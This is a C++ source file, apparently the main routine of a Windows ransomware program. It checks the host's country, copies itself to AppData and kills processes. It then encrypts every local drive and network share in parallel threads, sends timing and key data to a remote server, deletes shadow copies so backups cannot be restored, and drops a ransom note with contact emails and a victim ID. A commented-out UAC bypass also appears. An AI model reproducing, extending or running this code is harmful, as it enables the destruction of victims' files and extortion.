#pragma comment(linker, "/SUBSYSTEM:CONSOLE")
#include <Windows.h>
#include "../Utils.h"
#include "../Api.h"
#include "Main.h"

// Глобальные переменные

Build_Data* data = NULL;
CRITICAL_SECTION cs;
int filesInfected = 0;

void Close()
{
	// Utils::RemoveCritical();
	DeleteCriticalSection(&cs);
	ExitProcess(0);
}

HCRYPTKEY importRsa(HCRYPTPROV prov, char *filePath)
{
	HCRYPTKEY rsa = NULL;
	
	HANDLE hFile = CreateFile(filePath, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		BYTE buf[2048];
		DWORD keyLen;
		ReadFile(hFile, buf, sizeof(buf), &keyLen, NULL);
		if (!CryptImportKey(prov, buf, keyLen, NULL, CRYPT_EXPORTABLE, &rsa)) Dbg::print("Rsa key not imported\n");
		else Dbg::print("Rsa key imported\n");
		CloseHandle(hFile);
	}
	return rsa;
}

void Entry()
{
	InitApi();

	T_sendFunction sendInfo = (HTTPS == 1) ? sendInfo_WinInet : sendInfo_socket;
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 0), &wsaData);
	CoInitialize(0);

	if (CheckCountry()) ExitProcess(0);

	Utils::ProtectProcess();
	data = (Build_Data*)Utils::ReadInfo();
	if (!data) ExitProcess(0);

	LPSTR appdataCopy = CopyToAppData(data->appdata_name);

	if (appdataCopy)
	{
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		Mem::Zero(&si, sizeof(STARTUPINFO));
		Mem::Zero(&pi, sizeof(PROCESS_INFORMATION));
		si.cb = sizeof(STARTUPINFO);
		CreateProcess(appdataCopy, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		ExitProcess(0);
	}

	if (!InitializeCriticalSectionAndSpinCount(&cs, 0x400)) ExitProcess(0);
	
	Utils::CloseProcesses(data->appdata_name);

	/* HANDLE hMutex = CreateMutex(NULL, FALSE, Strs::trump);
	if (Utils::getLastError() != ERROR_ALREADY_EXISTS)
	{
		Utils::UacBypass();
	}
	Utils::LPE(); */

	char *startTime = Utils::GetCurTime();

	char *disks = Utils::GetDisks();

	int dataLen = lstrlen(disks) + MAX_NETWORKS;
	PHANDLE Threads = (PHANDLE)Mem::Alloc(dataLen * sizeof(HANDLE));
	CRYPT_INFO** pInfo = (CRYPT_INFO**)Mem::Alloc(dataLen);

	HCRYPTPROV prov = NULL;
	HCRYPTKEY rsa_key = NULL;
	
	if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
	{
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_AES, CRYPT_NEWKEYSET | CRYPT_VERIFYCONTEXT)) Close();
	}
	char keyPath[MAX_PATH];
	SHGetFolderPath(0, CSIDL_MYDOCUMENTS, NULL, 0, keyPath);
	lstrcat(keyPath, "\\");
	lstrcat(keyPath, Strs::publicKey);
	
	if ((rsa_key = importRsa(prov, keyPath)) == NULL)
	{
		if (!CryptGenKey(prov, AT_KEYEXCHANGE, RSA2048BIT_KEY | CRYPT_EXPORTABLE, &rsa_key)) Close();
		dropKey(prov, rsa_key);
	}

	int Index;
	for (Index = 0; disks[Index]; ++Index)
	{
		CRYPT_INFO* cryptInfo = (CRYPT_INFO*)Mem::Alloc(sizeof(CRYPT_INFO));
		cryptInfo->prov = prov;
		cryptInfo->key = rsa_key;
		pInfo[Index] = cryptInfo;
		char *disk = (char*)Mem::Alloc(8);
		disk[0] = disks[Index];
		disk[1] = 0;
		lstrcat(disk, ":\\");
		Mem::Copy(cryptInfo->path, disk, lstrlen(disk) + 1);
		HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)EncryptDisk, cryptInfo, 0, 0);
		Threads[Index] = hThread;
	}
	
	LPSTR* network = GetNetwork();
	LPSTR* folders = network;
	for (; *folders; ++Index, ++folders)
	{
		CRYPT_INFO* cryptInfo = (CRYPT_INFO*)Mem::Alloc(sizeof(CRYPT_INFO));
		cryptInfo->prov = prov;
		cryptInfo->key = rsa_key;
		pInfo[Index] = cryptInfo;
		PathAddBackslash(*folders);
		Mem::Copy(cryptInfo->path, *folders, lstrlen(*folders) + 1);
		Mem::Free(*folders);
		HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)EncryptDisk, cryptInfo, 0, 0);
		Threads[Index] = hThread;
	}

	WaitForMultipleObjects(Index - 1, Threads, TRUE, INFINITE);

	Mem::Free(Threads);
	Mem::Free(disks);
	Mem::Free(network);

	Dbg::print("Encrypted: %d\n", filesInfected);

	for (int i = 0; i < Index; ++i) Mem::Free(pInfo[i]);

	char *endTime = Utils::GetCurTime();

	LPSTR base64Key = readKey();

	sendInfo(startTime, endTime, base64Key);

	Mem::Free(startTime);
	Mem::Free(endTime);
	Mem::Free(base64Key);

	if (rsa_key)
		CryptDestroyKey(rsa_key);
	if (prov)
		CryptReleaseContext(prov, 0);


	Utils::DeleteVss();
	dropNode(data->email1, data->email2, Utils::GetVictimId());

	ShowNode();

	Close();
}
